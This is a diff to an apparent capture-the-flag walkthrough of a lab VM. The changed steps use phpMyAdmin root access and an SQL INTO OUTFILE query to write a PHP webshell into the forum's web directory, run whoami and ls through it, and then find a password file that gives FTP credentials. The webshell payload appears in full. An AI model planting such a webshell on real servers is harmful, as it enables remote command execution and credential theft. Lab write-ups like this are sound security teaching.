@@ -72,9 +72,24 @@ But it is not the ssh credentials yet. It is a way to access the web DB.
 12) We are root on the DB. Phpmyadmin is a GUI to handle table database and to make SQL queries.
 We will try to create a new php page through SQL with the intent to create a webshell.
 
-let's try the request given in this article : https://www.netspi.com/blog/technical-blog/network-pentesting/linux-hacking-case-studies-part-3-phpmyadmin/
+let's try the SQL request given in this article : https://www.netspi.com/blog/technical-blog/network-pentesting/linux-hacking-case-studies-part-3-phpmyadmin/
 
-SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET[\'cmd\']) {​​system($_GET[\'cmd\']);}​​ ?> </pre></BODY></HTML>"
-INTO OUTFILE '/var/www/forum/cmd.php'
+SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET[\'cmd\']) {​​system($_GET[\"cmd\"]);}​​ ?> </pre></BODY></HTML>"
+INTO OUTFILE '/var/www/forum/templates_c/cmd.php'
+
+13) Thanks to the webshell we can check the files in there:
+If we do "whoami" we see that we are www-data user.
+We try ls -la /
+
+We can see the various directories. With home created by www-data the other one are root
+ls -la /home
+There is a directory LOOKATME. It is the only one with content. 
+there is a file named password. 
+We get another password for lmezard but still not the root password for bornToSecHackMe.
+
+14) It happens to be credentials for ftp. We can see its open port
+type ftp <IP_VM>
+
+There is a readme and a fun files
 
 
